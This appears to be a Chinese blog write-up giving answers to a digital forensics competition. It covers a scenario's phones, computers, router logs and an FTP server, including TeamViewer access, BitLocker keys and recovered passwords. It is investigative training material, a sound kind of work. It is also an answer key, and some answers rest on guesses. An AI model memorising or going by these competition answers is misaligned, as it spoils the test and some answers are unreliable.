<h1 id="3-工地主管电话的哪一个应用程序有关于经纬度24-490474-118-110220的纪录"><a href="#3-工地主管电话的哪一个应用程序有关于经纬度24-490474-118-110220的纪录" class="headerlink" title="3.工地主管电话的哪一个应用程序有关于经纬度24.490474, 118.110220的纪录?"></a>3.工地主管电话的哪一个应用程序有关于经纬度24.490474, 118.110220的纪录?</h1><p>同样搜索<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/9.png" class="" title="alt text"></p>
<h1 id="4-工地主管的手提电话中下列哪些数据正确"><a href="#4-工地主管的手提电话中下列哪些数据正确" class="headerlink" title="4.工地主管的手提电话中下列哪些数据正确?"></a>4.工地主管的手提电话中下列哪些数据正确?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/10.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/12.png" class="" title="alt text">
<p>选A，C</p>
<h1 id="5-工地主管的电话最常使用的浏览器是什么-请以英文全大写回答"><a href="#5-工地主管的电话最常使用的浏览器是什么-请以英文全大写回答" class="headerlink" title="5.工地主管的电话最常使用的浏览器是什么? (请以英文全大写回答)"></a>5.工地主管的电话最常使用的浏览器是什么? (请以英文全大写回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/13.png" class="" title="alt text">
<p>SAFARI<br>网页浏览记录里有浏览器名称</p>
<h1 id="6-工地主管的电话连接过哪一个WiFi"><a href="#6-工地主管的电话连接过哪一个WiFi" class="headerlink" title="6.工地主管的电话连接过哪一个WiFi?"></a>6.工地主管的电话连接过哪一个WiFi?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/wifi.png" class="" title="alt text">
<p>再无线网络了可以找到之前连接的WiFi名</p>
<h1 id="7-工地主管与Alex-Chan的Whatsapp-对话中，曾提及以下哪个TeamViewer的用户号码"><a href="#7-工地主管与Alex-Chan的Whatsapp-对话中，曾提及以下哪个TeamViewer的用户号码" class="headerlink" title="7.工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码?"></a>7.工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/14.png" class="" title="alt text">
<p>聊天记录的这三张图片含有用户ID</p>
<h1 id="8-工地主管的WhatsApp中有多少个黑名单的记录-请以阿拉伯数字回答"><a href="#8-工地主管的WhatsApp中有多少个黑名单的记录-请以阿拉伯数字回答" class="headerlink" title="8.工地主管的WhatsApp中有多少个黑名单的记录? (请以阿拉伯数字回答)"></a>8.工地主管的WhatsApp中有多少个黑名单的记录? (请以阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/bu.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/15.png" class="" title="alt text">
<p>从数据库里找会发现找不到blacklist</p>
<h1 id="9-以下哪个蓝牙装置的-Uuid-曾连接过工地主管的手机"><a href="#9-以下哪个蓝牙装置的-Uuid-曾连接过工地主管的手机" class="headerlink" title="9.以下哪个蓝牙装置的 Uuid 曾连接过工地主管的手机?"></a>9.以下哪个蓝牙装置的 Uuid 曾连接过工地主管的手机?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/bule.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/uu.png" class="" title="alt text">
<h1 id="10-工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么-请以英文全大写及阿拉伯数字回答，不用输入”-“"><a href="#10-工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么-请以英文全大写及阿拉伯数字回答，不用输入”-“" class="headerlink" title="10.工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)"></a>10.工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/16.png" class="" title="alt text">
<p>搜索Bitlocker可以找到</p>
<h1 id="11-工地主管计算机內的FTP程序FileZilla的用户名称是甚么"><a href="#11-工地主管计算机內的FTP程序FileZilla的用户名称是甚么" class="headerlink" title="11.工地主管计算机內的FTP程序FileZilla的用户名称是甚么?"></a>11.工地主管计算机內的FTP程序FileZilla的用户名称是甚么?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/y.png" class="" title="alt text">
<h1 id="12-工地主管的Team-Viewer-ID-是甚么-请以英文全大写及阿拉伯数字回答"><a href="#12-工地主管的Team-Viewer-ID-是甚么-请以英文全大写及阿拉伯数字回答" class="headerlink" title="12.工地主管的Team Viewer ID 是甚么? (请以英文全大写及阿拉伯数字回答)"></a>12.工地主管的Team Viewer ID 是甚么? (请以英文全大写及阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/18.png" class="" title="alt text">
<h1 id="13-工地主管的Team-Viewer与哪一个ID连接-请以英文全大写及阿拉伯数字回答"><a href="#13-工地主管的Team-Viewer与哪一个ID连接-请以英文全大写及阿拉伯数字回答" class="headerlink" title="13.工地主管的Team Viewer与哪一个ID连接? (请以英文全大写及阿拉伯数字回答)"></a>13.工地主管的Team Viewer与哪一个ID连接? (请以英文全大写及阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/18.png" class="" title="alt text">
<h1 id="14-多选题-工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻"><a href="#14-多选题-工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻" class="headerlink" title="14.(多选题) 工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻?"></a>14.(多选题) 工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/19.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/20.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/21.png" class="" title="alt text">
<p>选择facebook和web whatsapp，linkg没有再关键词出现，而是再网页url出现</p>
<h1 id="工地主管计算机的Windows系统的产品标识符是甚么-请以英文全大写及阿拉伯数字回答，不用输入”-“"><a href="#工地主管计算机的Windows系统的产品标识符是甚么-请以英文全大写及阿拉伯数字回答，不用输入”-“" class="headerlink" title="工地主管计算机的Windows系统的产品标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)"></a>工地主管计算机的Windows系统的产品标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/22.png" class="" title="alt text">
<h1 id="16-工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通"><a href="#16-工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通" class="headerlink" title="16.工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通?"></a>16.工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/log.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/a.png" class="" title="alt text">
<p>我们可以看到whatsapp的log文件打开可以才出来应该记录了web端的一些内容。<br>查一下85246761157可以查到，那应该就是这个了</p>
<h1 id="17-多选题-工地主管计算机的用户名称是甚么-其用户标识符是甚么"><a href="#17-多选题-工地主管计算机的用户名称是甚么-其用户标识符是甚么" class="headerlink" title="17.(多选题) 工地主管计算机的用户名称是甚么? 其用户标识符是甚么?"></a>17.(多选题) 工地主管计算机的用户名称是甚么? 其用户标识符是甚么?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/23.png" class="" title="alt text">
<p>PC1</p>
<h1 id="18-单选题-工地主管计算机的预设浏览器是甚么"><a href="#18-单选题-工地主管计算机的预设浏览器是甚么" class="headerlink" title="18.(单选题) 工地主管计算机的预设浏览器是甚么?"></a>18.(单选题) 工地主管计算机的预设浏览器是甚么?</h1><p>预设浏览器其实就是默认浏览器<br>我们可以打开仿真之后创建应该html文件，也可以从浏览器的使用数量上猜出是谷歌</p>
<h1 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h1><h1 id="20-多选题-路由器的记录中显示以下有哪些IP是公司的电子器材"><a href="#20-多选题-路由器的记录中显示以下有哪些IP是公司的电子器材" class="headerlink" title="20.(多选题) 路由器的记录中显示以下有哪些IP是公司的电子器材?"></a>20.(多选题) 路由器的记录中显示以下有哪些IP是公司的电子器材?</h1><p>一个个搜可以搜出来abcd都是</p>
<h1 id="21-路由器的记录中显示公司的计算机下载了FTP软件，该下载网站的IP是什麼-请以亚拉伯数字作答，省去”-”符号"><a href="#21-路由器的记录中显示公司的计算机下载了FTP软件，该下载网站的IP是什麼-请以亚拉伯数字作答，省去”-”符号" class="headerlink" title="21.路由器的记录中显示公司的计算机下载了FTP软件，该下载网站的IP是什麼?(请以亚拉伯数字作答，省去”.”符号)"></a>21.路由器的记录中显示公司的计算机下载了FTP软件，该下载网站的IP是什麼?(请以亚拉伯数字作答，省去”.”符号)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/d.png" class="" title="alt text">
<p>49.12.121.147</p>
<h1 id="22-多选题-路由器的记录中显示公司计算机的资料用FTP软件传到了甚么IP地址及利用端口"><a href="#22-多选题-路由器的记录中显示公司计算机的资料用FTP软件传到了甚么IP地址及利用端口" class="headerlink" title="22.(多选题) 路由器的记录中显示公司计算机的资料用FTP软件传到了甚么IP地址及利用端口?"></a>22.(多选题) 路由器的记录中显示公司计算机的资料用FTP软件传到了甚么IP地址及利用端口?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/26.png" class="" title="alt text">
<p>我们看软件连接记录可以发现ip<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/25.png" class="" title="alt text"><br>在log里搜一下可以发现其ip和端口</p>
<h1 id="23-多选题-路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机"><a href="#23-多选题-路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机" class="headerlink" title="23.(多选题) 路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机?"></a>23.(多选题) 路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/25.png" class="" title="alt text">
<p>FTP通信的两个关键词outside(输出)和destiation(目标)都可以表示</p>
<h1 id="24-路由器的记录中显示哪一个IP曾以teamviewer-连接公司计算机"><a href="#24-路由器的记录中显示哪一个IP曾以teamviewer-连接公司计算机" class="headerlink" title="24.路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机?"></a>24.路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/T.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/27.png" class="" title="alt text">
<p>打开连接信息的文件可以发现详细的连接日志。发现连接时间在18号的9点31分10s。在路由日志中查找发现找不到，但是找到了相近时间<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/28.png" class="" title="alt text"><br>猜测为延迟。<br>定位后就会发现ip为52.152.117.114</p>
<h1 id="25-多选题-路由器的记录中显示以下哪一个有可能是以-teamviewer-遥控公司计算机的时间"><a href="#25-多选题-路由器的记录中显示以下哪一个有可能是以-teamviewer-遥控公司计算机的时间" class="headerlink" title="25.(多选题) 路由器的记录中显示以下哪一个有可能是以 teamviewer 遥控公司计算机的时间?"></a>25.(多选题) 路由器的记录中显示以下哪一个有可能是以 teamviewer 遥控公司计算机的时间?</h1><p>在日志以ip来搜索可以找到时间</p>
<h1 id="26-路由器的记录中显示有多少电子器材有可能曾被入侵-请以阿拉伯数字作答"><a href="#26-路由器的记录中显示有多少电子器材有可能曾被入侵-请以阿拉伯数字作答" class="headerlink" title="26.路由器的记录中显示有多少电子器材有可能曾被入侵?(请以阿拉伯数字作答)"></a>26.路由器的记录中显示有多少电子器材有可能曾被入侵?(请以阿拉伯数字作答)</h1><p>投稿ip来搜索看日志可以发现有三个时间段的teamviewer记录所以应该是3</p>
<h1 id="27-阿力士-iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC-8）？"><a href="#27-阿力士-iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC-8）？" class="headerlink" title="27.阿力士 iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC+8）？"></a>27.阿力士 iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC+8）？</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/yuan.png" class="" title="alt text">
<p>分享过的图片会产生一个没有元数据的缩略图片，所以应该是11</p>
<h1 id="28-阿力士iPhone-12-pro电话中哪一张相片可能曾被修改拍摄时间"><a href="#28-阿力士iPhone-12-pro电话中哪一张相片可能曾被修改拍摄时间" class="headerlink" title="28.阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间?"></a>28.阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间?</h1><h1 id="29-阿力士iPhone-12-pro-的GSM媒体访问控制地址是什么-请以英文全大写及阿拉伯数字回答，不用输入”"><a href="#29-阿力士iPhone-12-pro-的GSM媒体访问控制地址是什么-请以英文全大写及阿拉伯数字回答，不用输入”" class="headerlink" title="29.阿力士iPhone 12 pro 的GSM媒体访问控制地址是什么? 请以英文全大写及阿拉伯数字回答，不用输入”:"></a>29.阿力士iPhone 12 pro 的GSM媒体访问控制地址是什么? 请以英文全大写及阿拉伯数字回答，不用输入”:</h1><p>GSM其实就是mac地址<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/34.png" class="" title="alt text"></p>
<h1 id="30-阿力士的iphone-12-pro以什么屏幕密码保护"><a href="#30-阿力士的iphone-12-pro以什么屏幕密码保护" class="headerlink" title="30.阿力士的iphone 12 pro以什么屏幕密码保护?"></a>30.阿力士的iphone 12 pro以什么屏幕密码保护?</h1><h1 id="31-阿力士iphone-12-pro内以下哪一张相片是实况相片-live-Photos"><a href="#31-阿力士iphone-12-pro内以下哪一张相片是实况相片-live-Photos" class="headerlink" title="31.阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)?"></a>31.阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/35.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/36.png" class="" title="alt text">
<p>ios的实况照片的拍摄会在同文件下生成mov文件。</p>
<h1 id="32-以下哪一个是阿力士iphone-12-pro可能曾经连接的装置名称"><a href="#32-以下哪一个是阿力士iphone-12-pro可能曾经连接的装置名称" class="headerlink" title="32.以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称?"></a>32.以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/37.png" class="" title="alt text">
<p> Chris’s MacBook Pro</p>
<h1 id="33-接上题，记录连接时间是什么时候-UTC-8"><a href="#33-接上题，记录连接时间是什么时候-UTC-8" class="headerlink" title="33.接上题，记录连接时间是什么时候(UTC+8)?"></a>33.接上题，记录连接时间是什么时候(UTC+8)?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/38.png" class="" title="alt text">
<p>题目要求UTC+8所以就加8小时即可</p>
<h1 id="34-阿力士iPhone-XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：佢叫我俾钱喎，BTC係唔係呢个啊？。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？"><a href="#34-阿力士iPhone-XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：佢叫我俾钱喎，BTC係唔係呢个啊？。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？" class="headerlink" title="34.阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：佢叫我俾钱喎，BTC係唔係呢个啊？。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？"></a>34.阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：佢叫我俾钱喎，BTC係唔係呢个啊？。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/39.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/40.png" class="" title="alt text">
<p>可以发现在KariserLee和Alex的WhatsApp的该条聊天都被删除，而Alex并没有权限删除Kariser Lee的聊天记录，而KariserLee可以撤回消息。且附件有一张图片</p>
<h1 id="35-阿力士iPhone-XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC-请以阿拉伯数字回答"><a href="#35-阿力士iPhone-XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC-请以阿拉伯数字回答" class="headerlink" title="35. 阿力士iPhone XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC? (请以阿拉伯数字回答)"></a>35. 阿力士iPhone XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC? (请以阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/41.png" class="" title="alt text">
<p>10个</p>
<h1 id="36-阿力士iPhone-XR中-“IMG-0056-HEIC”的图像与”5005-JPG”-MD5-96c48152249536d14eaa80086c92fcb9-”-看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确"><a href="#36-阿力士iPhone-XR中-“IMG-0056-HEIC”的图像与”5005-JPG”-MD5-96c48152249536d14eaa80086c92fcb9-”-看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确" class="headerlink" title="36.阿力士iPhone XR中 “IMG_0056.HEIC”的图像与”5005.JPG”(MD5: 96c48152249536d14eaa80086c92fcb9)” 看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确?"></a>36.阿力士iPhone XR中 “IMG_0056.HEIC”的图像与”5005.JPG”(MD5: 96c48152249536d14eaa80086c92fcb9)” 看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/h.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/h2.png" class="" title="alt text">
<p>两个的图片md5值不同。<br>5005.JPG的分辨率更低所以5005是缩略图</p>
<h1 id="37-阿力士iPhone-XR中相片檔IMG-0056-HEIC提供了什么电子数据取证的信息"><a href="#37-阿力士iPhone-XR中相片檔IMG-0056-HEIC提供了什么电子数据取证的信息" class="headerlink" title="37.阿力士iPhone XR中相片檔IMG_0056.HEIC提供了什么电子数据取证的信息?"></a>37.阿力士iPhone XR中相片檔IMG_0056.HEIC提供了什么电子数据取证的信息?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/h3.png" class="" title="alt text">
<p>拍摄时间是捕获时间比创建时间早且相机型号是iPhone12pro，所以应该是12pro拍摄的。<br>又因为是多选所以应该是airdrop的文件</p>
<h1 id="38-阿力士iPhone-XR中阿力士的电邮账户Alexc19851016-gmail-com的密码有可能是什么"><a href="#38-阿力士iPhone-XR中阿力士的电邮账户Alexc19851016-gmail-com的密码有可能是什么" class="headerlink" title="38. 阿力士iPhone XR中阿力士的电邮账户Alexc19851016@gmail.com的密码有可能是什么?"></a>38. 阿力士iPhone XR中阿力士的电邮账户Alexc19851016@gmail.com的密码有可能是什么?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/42.png" class="" title="alt text">
<p>直接搜邮箱就可以找到密码</p>
<h1 id="39-阿力士iPhone-XR曾经连接Wifi-“Alex-Home”的密码是什么-请以英文全大写及阿拉伯数字回答"><a href="#39-阿力士iPhone-XR曾经连接Wifi-“Alex-Home”的密码是什么-请以英文全大写及阿拉伯数字回答" class="headerlink" title="39. 阿力士iPhone XR曾经连接Wifi “Alex Home”的密码是什么? (请以英文全大写及阿拉伯数字回答)"></a>39. 阿力士iPhone XR曾经连接Wifi “Alex Home”的密码是什么? (请以英文全大写及阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/43.png" class="" title="alt text">
<p>123456</p>
<h1 id="40-阿力士iPhone-XR经iCloud备份的最后时间是什么-UTC-8"><a href="#40-阿力士iPhone-XR经iCloud备份的最后时间是什么-UTC-8" class="headerlink" title="40.阿力士iPhone XR经iCloud备份的最后时间是什么?(UTC+8)?"></a>40.阿力士iPhone XR经iCloud备份的最后时间是什么?(UTC+8)?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/44.png" class="" title="alt text">
<p>看设备信息可以看到云备份时间</p>
<h1 id="41-阿力士iPhone-XR中的iBoot版本是-请以阿拉伯数字回答，不用轮入”-”"><a href="#41-阿力士iPhone-XR中的iBoot版本是-请以阿拉伯数字回答，不用轮入”-”" class="headerlink" title="41.阿力士iPhone XR中的iBoot版本是 (请以阿拉伯数字回答，不用轮入”.”)"></a>41.阿力士iPhone XR中的iBoot版本是 (请以阿拉伯数字回答，不用轮入”.”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/45.png" class="" title="alt text">
<p>查看phoneinfo文件</p>
<h1 id="42-阿力士iPhone-XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9-30』有以下哪一个成员"><a href="#42-阿力士iPhone-XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9-30』有以下哪一个成员" class="headerlink" title="42.阿力士iPhone XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9/30』有以下哪一个成员?"></a>42.阿力士iPhone XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9/30』有以下哪一个成员?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/46.png" class="" title="alt text">
<h1 id="43-阿力士的计算机显示曾于hongkongcard-com-的论坛登记成为会员，以下哪个是他的帐户密码"><a href="#43-阿力士的计算机显示曾于hongkongcard-com-的论坛登记成为会员，以下哪个是他的帐户密码" class="headerlink" title="43.阿力士的计算机显示曾于hongkongcard.com 的论坛登记成为会员，以下哪个是他的帐户密码?"></a>43.阿力士的计算机显示曾于hongkongcard.com 的论坛登记成为会员，以下哪个是他的帐户密码?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/47.png" class="" title="alt text">
<p>可以发现为谷歌账号，我们在38题里有找到密码</p>
<h1 id="44-阿力士的计算机显示阿力士曾用什么方法进入受害者-主管-的计算机"><a href="#44-阿力士的计算机显示阿力士曾用什么方法进入受害者-主管-的计算机" class="headerlink" title="44.阿力士的计算机显示阿力士曾用什么方法进入受害者(主管)的计算机?"></a>44.阿力士的计算机显示阿力士曾用什么方法进入受害者(主管)的计算机?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/48.png" class="" title="alt text">
<p>用的是远控软件</p>
<h1 id="45-续上题，阿力士最后一次进入受害者-主管-计算机的时间是什么"><a href="#45-续上题，阿力士最后一次进入受害者-主管-计算机的时间是什么" class="headerlink" title="45.续上题，阿力士最后一次进入受害者(主管)计算机的时间是什么?"></a>45.续上题，阿力士最后一次进入受害者(主管)计算机的时间是什么?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/48.png" class="" title="alt text">
<p>远控记录可以看到时间</p>
<h1 id="46-阿力士的计算机显示他曾经使用FTP程序，FTP的主机IP地址是什麼-请以亚拉伯数字作答，省去”-”符号"><a href="#46-阿力士的计算机显示他曾经使用FTP程序，FTP的主机IP地址是什麼-请以亚拉伯数字作答，省去”-”符号" class="headerlink" title="46.阿力士的计算机显示他曾经使用FTP程序，FTP的主机IP地址是什麼?(请以亚拉伯数字作答，省去”.”符号)"></a>46.阿力士的计算机显示他曾经使用FTP程序，FTP的主机IP地址是什麼?(请以亚拉伯数字作答，省去”.”符号)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/49.png" class="" title="alt text">
<h1 id="47-阿力士的计算机显示于2021年9月至2021年11月期间，计算机曾被登入过多少次-请以阿拉伯数字回答"><a href="#47-阿力士的计算机显示于2021年9月至2021年11月期间，计算机曾被登入过多少次-请以阿拉伯数字回答" class="headerlink" title="47.阿力士的计算机显示于2021年9月至2021年11月期间，计算机曾被登入过多少次? (请以阿拉伯数字回答)"></a>47.阿力士的计算机显示于2021年9月至2021年11月期间，计算机曾被登入过多少次? (请以阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/kog.png" class="" title="alt text">
<h1 id="48-阿力士计算机所安装的Microsoft-Office-2007-是以下哪一个版本-请以亚拉伯数字作答，省去”-”符号"><a href="#48-阿力士计算机所安装的Microsoft-Office-2007-是以下哪一个版本-请以亚拉伯数字作答，省去”-”符号" class="headerlink" title="48.阿力士计算机所安装的Microsoft Office 2007 是以下哪一个版本? (请以亚拉伯数字作答，省去”.”符号)"></a>48.阿力士计算机所安装的Microsoft Office 2007 是以下哪一个版本? (请以亚拉伯数字作答，省去”.”符号)</h1><p>仿真后再软件中查看，也可以再控制面板了查看<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/50.png" class="" title="alt text"></p>
<h1 id="49-以下是阿力士计算机中的Basic-data-partition-EFI-3-的Volume-ID-请以英文全大写及阿拉伯数字回答"><a href="#49-以下是阿力士计算机中的Basic-data-partition-EFI-3-的Volume-ID-请以英文全大写及阿拉伯数字回答" class="headerlink" title="49.以下是阿力士计算机中的Basic data partition (EFI 3) 的Volume ID?(请以英文全大写及阿拉伯数字回答)"></a>49.以下是阿力士计算机中的Basic data partition (EFI 3) 的Volume ID?(请以英文全大写及阿拉伯数字回答)</h1><p>Volume卷ID，我们将镜像挂载到E盘，如何再使用DiskGenius打开查看ID<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/51.png" class="" title="alt text"></p>
<h1 id="50-阿力士计算机的Window-product-ID是什么-请以英文全大写及阿拉伯数字回答，不用输入”-“"><a href="#50-阿力士计算机的Window-product-ID是什么-请以英文全大写及阿拉伯数字回答，不用输入”-“" class="headerlink" title="50.阿力士计算机的Window product ID是什么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)"></a>50.阿力士计算机的Window product ID是什么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/52.png" class="" title="alt text">
<p>产品ID</p>
<h1 id="51-阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确"><a href="#51-阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确" class="headerlink" title="51.阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确?"></a>51.阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/53.png" class="" title="alt text">
<img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/54.png" class="" title="alt text">
<p>再浏览器的下载记录里可以找到下载了一些图片，打开发现image(1)是猴子</p>
<h1 id="52-阿力士计算机所安装的Microsoft-Office-2007-的密钥是甚么-请以英文全大写及阿拉伯数字回答，不用输入”-“"><a href="#52-阿力士计算机所安装的Microsoft-Office-2007-的密钥是甚么-请以英文全大写及阿拉伯数字回答，不用输入”-“" class="headerlink" title="52.阿力士计算机所安装的Microsoft Office 2007 的密钥是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)"></a>52.阿力士计算机所安装的Microsoft Office 2007 的密钥是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/55.png" class="" title="alt text">
<p>仿真打开桌面的Microsoft 文件夹里面有key</p>
<h1 id="53-阿力士FTP-服务器用户使用命令行安装了甚么程序"><a href="#53-阿力士FTP-服务器用户使用命令行安装了甚么程序" class="headerlink" title="53.阿力士FTP 服务器用户使用命令行安装了甚么程序?"></a>53.阿力士FTP 服务器用户使用命令行安装了甚么程序?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/dd.png" class="" title="alt text">
<p>下载了docker</p>
<h1 id="54-以下哪些档案于阿力士FTP-服务器曾重复出现"><a href="#54-以下哪些档案于阿力士FTP-服务器曾重复出现" class="headerlink" title="54.以下哪些档案于阿力士FTP 服务器曾重复出现?"></a>54.以下哪些档案于阿力士FTP 服务器曾重复出现?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/56.png" class="" title="alt text">
<p>一个个搜能搜出答案</p>
<h1 id="55-在阿力士FTP服务器中，文件夹-曾被用户变更了访问权限-请以英文全大写及阿拉伯数字回答"><a href="#55-在阿力士FTP服务器中，文件夹-曾被用户变更了访问权限-请以英文全大写及阿拉伯数字回答" class="headerlink" title="55.在阿力士FTP服务器中，文件夹_曾被用户变更了访问权限(请以英文全大写及阿拉伯数字回答)"></a>55.在阿力士FTP服务器中，文件夹<em>_</em>曾被用户变更了访问权限(请以英文全大写及阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/57.png" class="" title="alt text">
<h1 id="56-在阿力士FTP-服务器建设后，有-个额外用户被加入-请以阿拉伯数字回答"><a href="#56-在阿力士FTP-服务器建设后，有-个额外用户被加入-请以阿拉伯数字回答" class="headerlink" title="56.在阿力士FTP 服务器建设后，有 _ 个额外用户被加入 (请以阿拉伯数字回答)"></a>56.在阿力士FTP 服务器建设后，有 <em>_</em> 个额外用户被加入 (请以阿拉伯数字回答)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/58.png" class="" title="alt text">
<p>加入了wai</p>
